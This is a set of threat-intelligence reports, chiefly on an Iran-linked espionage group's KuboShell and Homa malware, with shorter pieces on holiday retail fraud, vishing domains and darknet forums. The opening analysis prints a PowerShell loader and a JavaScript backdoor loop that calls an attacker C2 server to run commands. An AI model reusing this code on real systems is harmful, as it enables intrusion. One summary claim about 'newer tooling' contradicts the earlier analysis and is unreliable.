Stage 2 – PowerShell Loader

The second stage PowerShell script decodes an encoded string using a defined Xor-Decode function. It removes newline characters and processes the input in three-character numeric chunks. The resulting value is passed to Add-Type with the JavaScript language option, after which the script attempts to invoke a static run() method. A while($true) loop repeatedly executes this logic, with exception handling that retries compilation under an alternative type name.

function Xor-Decode { param ([string]$EncodedText) $key = [int][char]'o' $result = "" $clean = ($EncodedText -replace "`r|`n", "") for ($i = 0; $i -lt $clean.Length; $i += 3) { $num = [int]$clean.Substring($i, 3) $result += [char]($num -bxor $key) } return $result } $src = "079079079079028027014027006012..." $dec = Xor-Decode $src while($true) { try { $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc35')[1] $jsc::run() } catch { $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc36')[1] $jsc::run() } }

Stage 3 – JavaScript Backdoor

The backdoor implements a continuous C2 loop. It sends an initial hi message to hxxp://185.205.187[.]109:8000/X{key}, where key is a five-character alphanumeric hard-coded identifier populated per victim to act as a unique identifier. It communicates using the WinHttp.WinHttpRequest.5.1 COM object, which the server-side component checks for its default User-Agent string when handling incoming requests. The server’s response is interpreted as a command.

static function httppost(content, key) { try { var objHTTP = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); var url = "http://185.205.187[.]109:8000/X" + key; var data = content + "()" + key; objHTTP.Open("POST", url, false); objHTTP.Send(data); var res = objHTTP.responseText; res = res.slice(1, -1); return res; } ... } static function run() { ... while(true) { ... var cmd = httppost("hi", key); if (cmd.length > 2) { result = ex(cmd); } ... if(result.length > 2) { result = httppost(result, key); } sleep(); } }

The backdoor executes received commands according to their prefix:

PowerShell commands: Commands beginning with function are executed through hidden PowerShell with execution-policy bypass.

SSH commands: Commands beginning with ssh are launched asynchronously through cmd.exe, likely so that long-running SSH sessions, such as tunnels, won’t block the polling loop.

Other commands: Executed through cmd.exe /c, with standard output redirected to C:\Users\Public\outputt2.txt.

The backdoor reads the command output from the temporary file, strips non-printable characters and blank lines, and then deletes the file. Any output that’s produced is sent back to the C2 server using an HTTP POST request. The loop pauses for ten seconds between iterations.

We assess that the third-stage backdoor is designed, at least in part, to execute additional modules which we were unable to recover.

Code Similarities with MuddyWater

The Homa Framework’s third-stage payload closely resembles MuddyWater’s MuddyC2Go framework:

The same payload-delivery URI pattern: H followed by a 32 alphanumeric characters identifier

The same POST request format:

URI: X followed by a 5-character alphanumeric key.

Content is sent in the format ‘{content}(){key}’.

hi as the initial request’s content

Similar variable and function names as well as overall script structure

We assess that Homa’s client is a JavaScript reimplementation of the older MuddyC2Go client, potentially allowing Volant Manticore to retain the more complex server-side component with minimal modifications, thereby reducing development time and resources.

Operator Testing and Operational Environments

Volant Manticore operators tested KuboShell on their own machines, partially exposing their testing and development environments. MAC address prefixes and network adapter details indicate the use of both VirtualBox and VMware guests. Several VMware guests shared both a NAT subnet and a gateway. As VMware assigns this subnet per installation, these guests were likely running on the same host. Overall, we identified at least two distinct VMware environments in addition to the VirtualBox environment.

Taken together, the evidence suggests that at least two operators were engaging with the same Pinata account. One, whom we assess to be KuboShell’s developer, used a VirtualBox environment. The other operator primarily used VMware environments and appears to have been more directly involved in carrying out the campaign, including testing ahead of operational activity.

Some of these VMs also had VPN-related virtual adapters installed:

Multiple VMs with Fortinet SSL VPN.

An IVPN adapter on a VirtualBox guest that also had Fortinet adapters.

A VPN adapter associated with Kaspersky on a VMware guest.

The use of the IVPN adapter, a commercial privacy VPN, alongside a Fortinet adapter suggests that the VM might also be used operationally in addition to testing. The Fortinet adapters could indicate that the operators use enterprise VPN connections to access victim environments.

Like IVPN, the Kaspersky antivirus adapter can also provide a privacy VPN. However, because this VPN component can be bundled with the antivirus software, we consider it more likely that it reflects an antivirus installation on a machine used to test tooling against that product.

In addition, we identified a separate cluster of VMs with Azure-associated configuration that may also represent actor-controlled testing infrastructure. Within the command history, explicit Active Directory discovery commands were limited to this cluster. We suspect Volant Manticore used these VMs to test AD-related functionality in a prepared environment.

Eyes on the Kingdom: Shifting Focus Towards Saudi Arabia

Volant Manticore began targeting Saudi entities in September 2026. In contrast to their earlier, narrowly targeted campaigns in Cyprus, we observed a sudden spike in the group’s phishing activity against Saudi organizations, with a seeming focus on the healthcare sector. We assess that this shift may indicate that the operators were tasked, with short notice, to rapidly gain access to Saudi targets:

Spray-and-pray – Phishing activity delivering NetLock RMM increased significantly, and its targeting appears to have broadened within Saudi Arabia. Several samples used generic lure names such as “WhatsApp Images” or “Excel Online”, suggesting a wider pool of recipients rather than specific organizations. Other samples retained Saudi-themed names, such as Madinati-Platform.exe and برنامج الاعتماد المشترك في السياحة العلاجية.exe (“Joint Accreditation Program in Medical Tourism”). As mentioned above, in one case Volant Manticore appears to have sent the same target two similar phishing lures in quick succession, one delivering KuboShell and the other N-able RMM, which may be an effort to gain a foothold by any means.

Rushed development – The KuboShell sample targeting Saudi Arabia contained leftover debug strings absent from the previously observed sample, suggesting it was compiled and deployed in a hurry.

Repurposed infrastructure – The group used the overtly Cyprus-themed domain cnpcyprus[.]net as C2 for NetLock RMM samples used against Saudi targets. This is consistent with a rapid shift in targeting before the dedicated infrastructure was in place.

Geo-matched hosting – Even though they didn’t register a new domain, on October 11, Volant Manticore re-routed the existing domain to a newly provisioned Saudi-based HostZealot VPS at 185.253.118[.]221. This is consistent with the group’s observed pattern of using victim-facing C2 infrastructure within the targeted country, and further strengthens our hypothesis that, while Volant Manticore intended to rotate old infrastructure, they simply didn’t manage to do so in time. While configuring the new VPS, the operators also exposed an open directory at its root – an apparent operational security (OPSEC) slip that may reflect hurried deployment.

Figure 8 – NetLock RMM samples seen under various filenames.

One possible explanation for this apparent shift in targeting priorities is the escalating conflict involving Saudi Arabia and the Iranian-backed Houthis. The departure from the group’s earlier tailored spear-phishing supports two possible explanations. Volant Manticore’s handlers may have prioritized gaining access to a broader set of Saudi organizations over selectively targeting specific entities, or the operators were pushing hard to compromise these targets and sent them multiple lures within a short period, or both. Based on the available evidence, we cannot determine which is the likelier explanation.

Attribution

We assess with high confidence that Volant Manticore is an Iran-nexus threat group, and with medium confidence that it is at least historically linked to Iran’s Ministry of Intelligence and Security (MOIS). However, Iran’s cyber ecosystem is fluid, and the boundaries between the organizations engaged in such activity are not always clear-cut. We therefore cannot rule out that Volant Manticore now operates under a different Iranian entity.

Our assessment is based on these findings:

Working patterns – Timestamps of the operators’ activity align with working hours in Iran’s local time (UTC+3:30). The observed workweek also fits a Thursday–Friday weekend.

Figure 9 – Operator activity by hour.

Figure 10 – Operator activity by day of the week.

PDB path – The PDB path of the KuboShell sample uploaded from Saudi Arabia includes the directory F:\homa\. In Persian mythology, Homa is a mythical bird associated with good fortune and freedom.

Target scope – Saudi Arabia has long been a key target of Iranian cyber espionage operations. As we discussed in the Introduction section, Cyprus also fits within Iran’s regional targeting priorities.

Overlaps With MuddyWater

We identified several overlaps between Volant Manticore and MuddyWater, including:

Code similarities – The Homa Framework’s third-stage payload closely resembles MuddyWater’s MuddyC2Go framework, as we mentioned above.

TTPs – Both groups pair RMM tools with malicious documents in spear-phishing campaigns, and both have been tied to using compromised email accounts to register with RMM providers.

Matching server setup – Volant Manticore’s server at 185.253.118[.]221 and MuddyWater’s server at 159.198.36[.]115 both hosted a Python SimpleHTTPServer open-directory on port 4444.

For a deeper discussion of the attribution, see Appendix 1.

Conclusion

Volant Manticore shows how Iran’s cyber ecosystem continues to reshape itself. What appears to be a group of former MuddyWater operators now operates independently, pairing legacy MuddyWater tooling with new implants of their own while pursuing a regional focus that has until now drawn little attention.

Distinguishing Volant Manticore from MuddyWater is crucial. While the two groups currently share part of their tradecraft, we expect Volant Manticore to keep developing its own tooling and TTPs, and the differences between the two groups will become more pronounced over time. Treating Volant Manticore as part of MuddyWater could therefore lead to blind spots, particularly for organizations in Saudi Arabia and Cyprus.

Cyprus appeared to be Volant Manticore’s primary focus, which makes sense considering the island’s increasing alignment with Iran’s adversaries. In September 2026, however, this pattern changed abruptly. As the conflict between Saudi Arabia and the Houthis escalated, Volant Manticore pivoted to an intensified campaign against Saudi organizations before its tooling and infrastructure were fully ready.

We believe Volant Manticore will continue operating against Saudi Arabia as long as the conflict with the Houthis keeps escalating. Meanwhile, Cyprus will likely still remain a consistent target. More broadly, we expect Volant Manticore to remain responsive to geopolitical developments, potentially shifting its targeting priorities in the event of major changes in the regional situation.

Appendix 1 – Distinct Actors, Shared Roots?

Given our assessment that Volant Manticore is composed of former MuddyWater operators, we want to be transparent about our reasoning that led us to this conclusion. Considering the observed overlaps and the fluid nature of Iran’s threat landscape, we weighed several competing hypotheses:

Same actor – Volant Manticore and MuddyWater are the same group, or Volant Manticore is a subgroup operating within MuddyWater under specific tasking.

Spin-off – Volant Manticore comprises former MuddyWater operators who left individually or branched off together as a subgroup.

Professional ties – Operators of the two groups maintain formal or informal professional relationships.

Shared training – Operators of both groups share a common training background.

Shared developer – Both groups rely on a common developer, either an individual or a digital quartermaster.

Copycat – Volant Manticore imitates MuddyWater tooling and TTPs to create the appearance of an Iranian nexus.

Weighing the Alternatives

Volant Manticore relies on an older MuddyWater C2 framework, which MuddyWater has since replaced. A subgroup operating within MuddyWater would most likely have access to the group’s current tooling, making the same-actor hypothesis less likely. Similarly, a copycat would most likely imitate MuddyWater’s latest documented tooling, not a retired framework. Volant Manticore’s new custom implants, which serve as “guardrails” for Homa, make this scenario even less likely.

A shared developer could explain the tooling overlaps, but not the operational ones. While such a developer would likely have access to newer frameworks, Homa reimplements the older MuddyC2Go client and keeps its C2 protocol unchanged. This was likely done to evade existing detections with minimal development effort, leaving the server-side component untouched. Combined with our assessment that KuboShell was built by a single developer, this points to a small group with limited development resources, unlike the developers behind MuddyWater’s frameworks who replaced their tooling over time, most notably after public disclosures.

As for professional ties and shared training, key MuddyWater figures were previously linked to Ravin Academy, described as a talent pipeline for MOIS. Such ties could result in both a common training background and professional relationships between otherwise distinct groups. In fact, MuddyWater’s TTPs have previously overlapped with those of other Iranian actors. Most recently, Proofpoint identified shared TTPs between TA450 (MuddyWater) and UNK_SmudgedSerpent, which Check Point tracks as Nimbus Manticore.

However, both explanations seem less likely in our case. If shared training through Ravin explained the overlaps, we would expect the tooling and TTPs Volant Manticore shares with MuddyWater to be common across Iranian groups. In our observation, they are primarily associated with MuddyWater. As for professional ties, they could explain the UNK_SmudgedSerpent overlaps, which may reflect a one-off collaboration. Volant Manticore, by contrast, has relied on MuddyWater tooling and TTPs consistently over time. This consistency is better explained by habits formed over years of operating within MuddyWater than by occasional collaboration between two separate threat actors. We also observed no signs of operational cooperation that would indicate ongoing contact, such as common targeting or hand-offs.

Title: Fake Delivery Notices, Stolen Logins, and Malicious Domains Threaten Holiday Shoppers
Context: Attackers Can Target the Real Checkout, Too FortiGuard Labs also found underground listings offering access to existing online stores
Full Text:
A Missed Delivery May Lead to a Fake Payment Page

FortiGuard Labs identified lookalike domains impersonating major carriers, including USPS, UPS, FedEx, and DHL. Fake delivery notices can direct shoppers to pages requesting a small redelivery fee or updated shipping information, enabling operators to collect payments or personal data.

Researchers also documented a fraudulent storefront that copied Walmart’s logo, colors, and product listings to advertise Black Friday deals. A shopper who clicks a link from an ad, search result, or promotional email may encounter familiar branding all the way to checkout. Underground listings for bulk email, caller ID and SMS spoofing, and paid social media engagement show how operators could distribute those links and make fraudulent promotions appear more credible.

Underground Markets Put Stolen Retail Sessions Within Reach

From August through October 2026, FortiGuard Labs collected about 1.72 million infostealer log entries tied to seven major e-commerce platforms. Approximately 1.49 million were associated with Amazon, followed by eBay and AliExpress. The entries came from data that infostealer malware stole from users’ devices.

These logs often contain saved passwords, autofill data, and browser cookies. A valid stolen session cookie can let an attacker access a shopping session that’s already authenticated. Researchers observed a marketplace where buyers could filter listings by website and by whether logs contained cookies, making it easier to find data linked to a specific retailer. Other listings advertised automated tools to check stolen payment cards and services claiming to obtain fraudulent refunds from major retailers.

The report also highlights interest in using AI to make familiar scams more convincing. In one case, a forum user sought a model that could write fluent Romanian and understand local financial practices. This level of localization could make a fraudulent payment request or delivery notice sound more like something a shopper would expect to receive.

Attackers Can Target the Real Checkout, Too

FortiGuard Labs also found underground listings offering access to existing online stores. One seller advertised access to more than 1,000 OpenCart storefronts, claiming buyers could inject JavaScript into them. If the access were genuine, a buyer could use it to install payment-skimming code on legitimate storefronts.

The report also documents confirmed exploitation of vulnerabilities in widely used e-commerce and web platforms. For retailers, this underscores the importance of patching exposed storefronts and monitoring checkout code for changes, especially before transaction volumes increase.

What Retailers Can Do Before Peak Shopping Days

Track retailer and carrier impersonation. Monitor lookalike domains and fraudulent ads, submit confirmed abuse for takedown, and add verified malicious domains to DNS, email, and web filtering controls where appropriate.

Watch for account and payment abuse. Monitor for bursts of failed logins, unusual activity in existing sessions, and clusters of small payment attempts that may indicate card testing. Ensure response teams can quickly revoke compromised sessions.

Protect storefronts and checkout. Prioritize fixes for vulnerabilities under active exploitation, restrict internet-facing administrative access, and alert on unexpected changes to checkout scripts.

Provide customers with a way to verify messages. Retailers should remind shoppers that they can confirm an order or track a package through the retailer’s app, their order history, or the delivery carrier’s official website.

Protect Shoppers from the First Sale Through the Last Return

Holiday fraud can start with a fake promotion and continue through delivery and returns. Ahead of peak shopping days, retailers should verify that their account and checkout protections are working, watch for lookalike sites and fake ads, and monitor dark web marketplaces for stolen customer credentials or offers to access their storefronts. Too often, a shopper reporting a suspicious shipping text to customer support is the first to alert a retailer that someone is impersonating its brand. Customer support, fraud, and security teams must know how to share these reports so they can investigate quickly and take measures while the scam is still active.

Download the FortiGuard Labs Holiday Season Cyber Threats Report 2026 for the full breakdown of malicious domains, examples from underground marketplaces, and the e-commerce vulnerabilities security teams can review before peak shopping days.

Title: Okta Links ShinyHunters-Associated Vishing Group to New INCEPTION Data Leak Site
Context: A threat cluster previously assessed to be affiliated with the ShinyHunters extortion crew may have rebranded and continued operations under a new name called INCEPTION,...
Full Text:
A threat cluster previously assessed to be affiliated with the ShinyHunters extortion crew may have rebranded and continued operations under a new name called INCEPTION, according to Okta's Threat Intelligence team.

The cluster, dubbed O-UNC-053, is characterized by the use of voice phishing (aka vishing) attacks to trick targets into entering credentials in phishing pages and approving multi-factor authentication (MFA). Okta said it's been tracking the group since March 2026.

The identity and access management provider said targets of this cluster previously had stolen data published to the ShinyHunters data leak site (DLS). However, as of November 16, 2026, a new data leak site operating under the name INCEPTION has listed the data siphoned from O-UNC-053 targets.

"While this threat cluster has changed their brand affiliation, the operators remain active in targeting organizations with voice phishing attacks and account takeovers resulting in data theft and extortion," Okta researchers Moussa Diallo and Katie Nickels said in a report shared with The Hacker News.

Social engineering and credential harvesting attacks mounted by O-UNC-053 have targeted a broad range of sectors, including technology, healthcare, biotechnology, financial services, insurance, entertainment, gaming, retail, transportation, hospitality, and legal.

Similar to O-UNC-066 and UNC6671, the newly identified cluster also relies on a phishing kit to intercept authentication flows and capture a user's credentials and MFA codes. However, the kit is not designed to bypass phishing-resistant methods like passkeys and Okta FastPass.

"While interacting with targeted users on the phone, the operators socially engineer them into sharing factors like one-time passcodes and approving push notifications," Okta said. "If successful, the operators gain access to SaaS applications and exfiltrate sensitive data, which is often used to extort targets under the threat of releasing it on a data leak site."

Domains created by the group are registered through NiceNIC, Spaceship, Tucows, and NameSilo, with the domain names using the following patterns -

legal-<target>[.]com

legaldept-<target>[.]com

<target>[.]legal

<target>-legal[.]com

The use of "legal" themes in these attacks is said to have started in October 2026, and is often registered on or within a day of a campaign starting. Prior campaign waves have employed help desk-, support-, and claims-related themes for the registered domains.

These findings also dovetail with an alert from Palo Alto Networks Unit 42, which has warned of widespread vishing activity using legal-themed domains that either begin with "legal-" or end with "-legal" using the ".com" top-level domain.

More than 70 such domains have been observed since October 2026, it said, adding each domain is specifically created for an intended target operating in different industries, like cryptocurrency, financial services, healthcare, high technology, and hospitality, among others.

"Registered in rapid evening batches and shielded behind Cloudflare, these web-only domains deploy a filtered kit that delivers tailored content to intended victims while routing visitors it is not configured to attack to the targeted organization's legitimate Okta or NetIQ sign-in flow," ReversingLabs researcher Robert Simmons said.

Some of the confirmed domains linked to the activity are listed below -

legal-pepsico[.]com

legal-paychex[.]com

legal-duolingo[.]com

activisionblizzard-legal[.]com

legal-westernunion[.]com

legal-dropbox[.]com

legal-indeed[.]com

legal-creditkarma[.]com

legal-amd[.]com

legal-grubhub[.]com

legal-twitch[.]tv

The crux of the campaign is to tailor the landing page to the specific identity provider of the target, while filtering unwanted visitors and forwarding them to the organization's authentication infrastructure, such as Okta.

"Throughout our tracking of O-UNC-053 between March and September 2026, we observed the names of targeted entities appear on the ShinyHunters DLS between 1 and 28 days after the phishing infrastructure was registered," Okta noted.

However, it's unclear at this stage if the published data on the INCEPTION site is authentic and whether they are running the site themselves or are collaborating with another extortion gang. The exact nature of the relationship between ShinyHunters and O-UNC-053 is also unknown.

It's worth noting that the ShinyHunters data leak site went offline in late September 2026 following the arrest of three alleged members of the group, including a Canadian co-conspirator responsible for the breach of the FBIjobs.gov portal.

There is no evidence of data from O-UNC-053 targets being published on any data leak site from early September 2026 through October and early November 2026, until listings for multiple targets appeared on the INCEPTION site last week.

"This gap in publishing on any leak site followed by publishing on a new data leak site with a new brand is consistent with prior shifts from Com-affiliated actors," Okta said. "Regardless of the nature of the relationship with the INCEPTION DLS, O-UNC-053 remains active in conducting vishing attacks against targets in an effort to take over accounts, steal data, and extort targets."

Title: Darknet Forums Are Fragmenting as Observed Breach Activity Rises
Context: Check Point Exposure Management brings external threat intelligence together with asset, identity, vulnerability, and security control context to help teams assess relevant...
Full Text:
Repeated takedowns have disrupted some of the cybercrime underground’s established gathering places. The communities around them have continued to reorganize.

BreachForums revivals compete with clones and alternative platforms. Russian-speaking forums have struggled to replace the relationships built around XSS and RAMP. Activity moves between venues, and a platform that gains attention after one disruption may lose it after the next.

Check Point Exposure Management researchers examined two years of forum activity to understand how that disruption has changed the underground. The analysis found a more fragmented ecosystem, with observed breach and data-leak activity remaining substantial even as established forums lost continuity.

Average monthly observed breach and leak incidents increased by 15.3%, while average weekly initial access broker posts fell by 28.1% following the XSS seizure. These measurements describe different activities, but together they highlight the difficulty of interpreting a quieter forum as evidence of reduced risk.

For security teams, the challenge extends beyond identifying which forum comes next. It involves understanding what remains visible as the communities producing that intelligence become less stable.

Key Takeaways

Forum disruption has produced competing destinations. Revivals, clones, and alternative communities divide activity that previously concentrated around established platforms.

Observed breach and leak activity increased. Average monthly incidents rose from 273 before April 2025 to 315 from April 2025 onward.

Visible access-broker posting declined. Average weekly posts across monitored forums fell from 471 before the XSS seizure to 339 afterward.

Private trading remains a possible explanation. The data does not establish where access transactions moved or how much activity continued outside visible forums.

Trust has become harder to rebuild. Successor platforms can reproduce branding without inheriting administrators, reputation histories, or established relationships.

BreachForums Lost Its Permanent Center

Established forums offered more than a place to publish stolen data or advertise access. Reputation systems, escrow services, recognizable administrators, and long-standing identities helped participants decide whom to trust.

Those advantages encouraged activity to concentrate around a relatively small number of communities. A seller could build a recognizable history, while buyers could assess previous interactions before entering a transaction. The platform provided continuity between those encounters.

Repeated disruptions have weakened that model. When a major forum disappears, participants face competing claims about where the community will return and which replacement deserves their trust. Familiar branding can attract users without resolving uncertainty about who operates the replacement.

Figure 1. Seizure notices mark disruptions to established underground communities.

The BreachForums ecosystem illustrates this shift. Different revivals attempted to reconstruct the original community, while clones and alternative platforms competed for displaced activity. DarkForums, PwnForums, the new RaidForums, Spear, and BHF provided additional destinations.

Researchers observed activity distributed across these communities as BreachForums versions contracted, disappeared, or regained part of their audience. Some alternatives gained momentum temporarily; others sustained smaller communities.

Figure 2. Competing forums offer alternative destinations for breach-related activity.

The pattern is consistent with activity becoming dispersed. Similar changes in posting volume do not, on their own, prove that individual users moved between particular forums.

They also make identifying a lasting successor difficult. A burst of attention following another platform’s disruption may reflect temporary interest rather than an established community. Monitoring requires following those changes over time, beyond the initial appearance of a replacement.

Observed Breaches Increased Despite the Disruption

The forum changes did not coincide with a decline in the report’s observed breach and data-leak volume.

Figure 3. Average monthly observed breach and leak incidents increased across the comparison periods.

The figures do not establish that fragmentation caused the increase. They show that breach-related activity remained resilient while the platforms supporting its publication and trade became less stable.

These are incidents captured by the monitoring, rather than a complete count of breaches worldwide. November 2026 is also a partial observation and should not be compared directly with complete months.

Forum availability and breach activity therefore need to be assessed separately. A takedown can remove a publication venue, interrupt transactions, and unsettle participants without removing stolen information or the incentive to monetize it.

The broader finding remains clear: disruption weakened individual forums without eliminating the activity surrounding them.

Access-Broker Posts Tell a Different Story

Initial access brokers, or IABs, provide another view of the changing underground.

Public posting across the monitored forums declined following the XSS seizure. The report notes that ransomware activity did not follow the same downward trend.

Figure 4. Public IAB posting declined following the XSS seizure.

That divergence raises a visibility question. Fewer advertisements may mean fewer opportunities to observe access trading without demonstrating that compromised access has become less available.

Existing relationships offer one plausible explanation. A broker with reliable buyers or ransomware partners may have less reason to advertise each opportunity publicly. Those contacts can continue communicating outside visible marketplaces.

However, the available data cannot confirm where transactions moved. The decline measures publicly observed posting activity, rather than the full volume of access being obtained, exchanged, or used. Ransomware activity also cannot establish how a particular attacker obtained entry.

For security teams, that distinction affects how marketplace intelligence should be used. An advertisement can provide an important warning, but waiting for one makes the investigation dependent on a criminal’s decision to publish.

Exposed credentials, suspicious authentication, and evidence of an infostealer infection can warrant investigation independently. Teams need to establish whether access remains usable and what it could reach, even when no public listing identifies the organization.

A reduced stream of advertisements therefore provides limited reassurance about whether an organization has a usable entry point.

Russian-Speaking Communities Struggle to Replace Trust

A similar fragmentation is visible in ransomware-oriented Russian-speaking communities.

Forums such as XSS and RAMP accumulated relationships between administrators, access sellers, brokers, malware developers, and ransomware operators. Their disruption affected the trust surrounding those connections.

Exploit showed comparatively persistent activity across the two-year period. Newer communities, including DutyFree and T1erOn3, attempted to occupy parts of the space, generally with smaller and more volatile participation.

None should automatically be treated as a direct replacement for the communities that preceded them.

Launching a forum can restore a place to post. Rebuilding confidence in administrators, identities, and transactions takes longer. A familiar username or copied design cannot establish that the same people, safeguards, and relationships remain behind it.

Repeated disruptions force participants to make those judgments again, adding friction even when the underlying criminal community survives. Participants may need to reassess contacts, establish their identities elsewhere, or decide whether an unfamiliar administrator can be trusted.

This is an important part of the effect of law enforcement action. Continued activity does not mean disruption has achieved nothing. The cumulative burden can weaken the continuity that made established forums useful.

What Security Teams Can Learn

The report identifies three defining characteristics of the current forum landscape.

Figure 5. Three characteristics define the changing forum landscape.

These changes make intelligence coverage an ongoing task. Monitoring a fixed set of familiar venues can leave gaps as new communities emerge and established ones lose relevance. Coverage needs to evolve alongside the sources.

Posting volumes also need context. A spike requires validation before being treated as sustained growth. A decline should prompt questions about coverage and continuity before it is interpreted as reduced exposure. Comparing observations across sources helps avoid placing too much weight on one platform’s trajectory.

External findings then need to be connected with the organization’s environment. An access advertisement, exposed credential, or leaked document becomes useful when teams can establish its relevance and determine what action is required.

That could mean identifying an affected account, checking whether disclosed information remains sensitive, or investigating a service associated with advertised access. The intelligence provides a starting point; organizational context determines the response.

Check Point Exposure Management brings external threat intelligence together with asset, identity, vulnerability, and security control context to help teams assess relevant exposures, validate exploitability, and coordinate safe remediation. This helps connect activity in a changing underground with opportunities to reduce risk inside the organization.

Title: Volant Manticore: New Iranian Threat Group Expands Cyber Espionage Across Europe and the Middle East
Context: Volant Manticore is the first Iranian group observed by Check Point Research to make Cyprus a primary espionage target, focusing on telecommunications, aviation and critical...
Full Text:
Check Point Research has uncovered Volant Manticore, a previously undocumented Iran-nexus threat group that made Cyprus a primary espionage target before recently expanding its operations also to Saudi Arabia. This group’s focus provides another indication that Iranian cyber activity is becoming more geographically distributed, with targeting increasingly shaped by changing geopolitical priorities across the Middle East and Europe.

That change in focus is one of the most important parts of the discovery. It shows how quickly Volant Manticore’s targeting can respond to geopolitical developments and adds to evidence that Iranian cyber interests are extending beyond their traditional focus.

Key Findings

Check Point Research identified Volant Manticore, a previously undocumented Iran-nexus threat group historically linked to Iran’s Ministry of Intelligence and Security (MOIS).

Volant Manticore is the first Iranian group observed by Check Point Research to make Cyprus a primary espionage target, focusing on telecommunications, aviation and critical infrastructure.

In September 2026, the group shifted its focus to Saudi Arabia, with increased phishing activity targeting the healthcare sector.

Volant Manticore’s targeting appears responsive to geopolitical developments. Its recent shift toward Saudi Arabia, including the healthcare sector, may reflect escalating tensions between Saudi Arabia and the Iranian-backed Houthis.

Volant Manticore uses the KuboShell backdoor and Homa Framework, alongside remote management tools and credential-harvesting campaigns.

Check Point Research assesses that Volant Manticore is likely a separate group of former MuddyWater operators, combining legacy MuddyWater tradecraft with its own developing tools and infrastructure.

Who Is Volant Manticore?

Volant Manticore is an Iran-nexus cyber espionage group whose activity Check Point Research traced back to at least September 2025. Its operations were initially concentrated on Cyprus before expanding to Saudi Arabia in September 2026.

Check Point Research assesses with high confidence that Volant Manticore is an Iran nexus and with medium confidence that it is at least historically linked to Iran’s Ministry of Intelligence and Security. The group also has significant technical and operational overlaps with MuddyWater, an Iranian espionage group linked to MOIS and active since at least 2017.

The relationship between the two groups is an important part of the discovery. Volant Manticore uses older MuddyWater tradecraft, but its custom implants, infrastructure and targeting distinguish it from the latest MuddyWater operations. Check Point Research assesses with medium confidence that the group consists of former MuddyWater operators who now operate as an independent threat cluster.

Figure 1 – Volant Manticore activity timeline.

Cyprus at the Center of Volant Manticore’s Espionage Activity

One of the most significant findings is Volant Manticore’s sustained focus on Cyprus. Based on Check Point Research observations, it is the first Iranian threat group identified with Cyprus as a primary espionage target.

The group’s activity focused on organizations in strategically important sectors, including telecommunications, aviation and critical infrastructure. Cyprus has deepening defense and energy ties with Israel and Greece and plays a role in Western military operations in the region, increasing its potential intelligence value to Iranian operators.

The investigation began after researchers identified a fake CV belonging to “Athena Marinou,” an AI-generated travel and tourism professional supposedly based in Cyprus. A link presented as a download for the full CV instead directed the recipient to an archive containing KuboShell, a newly identified backdoor. Check Point Research assesses that the phishing attempt targeted a Cyprus-based airline whose business centers on flights between Cyprus and Israel.

Figure 2 – The fake CV used as a lure.

Researchers also connected the group’s infrastructure with an earlier January 2026 campaign. That operation used a malicious military-themed Word document and was likely aimed at a Cypriot government entity, potentially connected to the defense sector.

Taken together, the campaigns show a persistent focus on organizations that could provide intelligence related to Cyprus’s government, infrastructure and regional relationships.

From Cyprus to Saudi Arabia

That targeting pattern changed in September 2026. Volant Manticore began increasing its phishing activity against Saudi Arabian organizations, with an apparent focus on healthcare. The change coincided with escalating hostilities between Saudi Arabia and the Iranian-backed Houthis and is consistent with MOIS’s history of targeting healthcare organizations during military conflicts.

The way the group made this transition was particularly revealing. Its earlier campaigns against Cyprus relied on more tailored targeting, while the Saudi activity expanded to include generic lure names such as “WhatsApp Images” and “Excel Online.”

Researchers also found signs that the change may have happened quickly. A KuboShell sample targeting Saudi Arabia contained leftover debug strings, while infrastructure originally built around Cyprus was repurposed to support Saudi operations. The group later rerouted existing infrastructure to a newly provisioned server hosted in Saudi Arabia.

In one case, Volant Manticore appears to have sent the same target two similar phishing lures in quick succession: one delivered KuboShell, while another delivered N-able RMM. These findings suggest that the operators may have been tasked with gaining access to Saudi organizations on short notice, prioritizing access before dedicated tooling and infrastructure were fully in place.

How Volant Manticore Gains Access to Organizations

Volant Manticore relies heavily on phishing and social engineering, adapting its lures to the organizations and industries it targets. The Cyprus airline campaign used a fake CV, while the activity targeting Saudi Arabia included healthcare-themed files such as “AI Healthcare Seminar.” Other campaigns used malicious documents or credential-harvesting infrastructure designed to imitate corporate email and authentication services.

Once access is established, the group has several options. KuboShell acts as an initial backdoor and uses the InterPlanetary File System (IPFS), together with the Pinata service, for its command-and-control communication. Researchers observed KuboShell being used for initial reconnaissance before additional capabilities were deployed.

The group then uses the Homa Framework, a multi-stage post-compromise framework whose final-stage client closely resembles MuddyWater’s older MuddyC2Go framework.

Volant Manticore also uses legitimate remote monitoring and management software, including NetLock RMM, N-able RMM and MeshCentral. This mixture of custom malware and legitimate administrative tools provides several potential routes for maintaining access to compromised organizations.

Figure 3 – KuboShell infection chain and the Homa Framework stages.

The MuddyWater Connection

The overlaps between Volant Manticore and MuddyWater extend beyond individual malware samples. The Homa Framework closely resembles MuddyWater’s older MuddyC2Go framework, including similarities in its communication structure and command-and-control protocol. Researchers also observed shared operational techniques, including pairing malicious documents with legitimate remote management tools.

However, several findings suggest Volant Manticore has moved beyond being simply another MuddyWater operation.

Its operators don’t rely on an older MuddyWater framework, but rather on the group’s newer tooling. They have developed their own custom implants, created separate infrastructure and adopted additional techniques such as credential-harvesting campaigns. Their sustained focus on Cyprus also differs from MuddyWater’s broader targeting patterns.

Check Point Research therefore favors the assessment that Volant Manticore represents a spin-off composed of former MuddyWater operators. The group’s evolution suggests that its operators carried established techniques with them while gradually building their own operational identity.

What Volant Manticore Reveals About Iran’s Changing Cyber Focus

Volant Manticore matters beyond the discovery of another Iranian threat actor. Its activity provides another indication of a broader shift in Iranian cyber operations. While Israel remains a significant target, Iranian cyber efforts are becoming more geographically distributed, extending into countries across the Middle East and Europe in support of wider geopolitical interests.

Volant Manticore illustrates this particularly clearly. Cyprus remained a persistent espionage target, reflecting its strategic relationships and regional position. When tensions involving Saudi Arabia and the Iranian-backed Houthis escalated, however, the group’s activity shifted rapidly toward Saudi organizations.

The signs of rushed development, reused infrastructure and broader phishing suggest that operational priorities may have changed faster than the group could prepare for them.

For organizations, this matters because cyber risk can change alongside geopolitical events. A company does not need to be directly involved in a conflict to become an intelligence target. Its location, industry, infrastructure, partners or strategic relationships can be enough to make it relevant to a state-linked threat actor.

What Should Organizations Look Out For?

The methods observed in Volant Manticore’s campaigns give security teams several concrete areas to monitor.

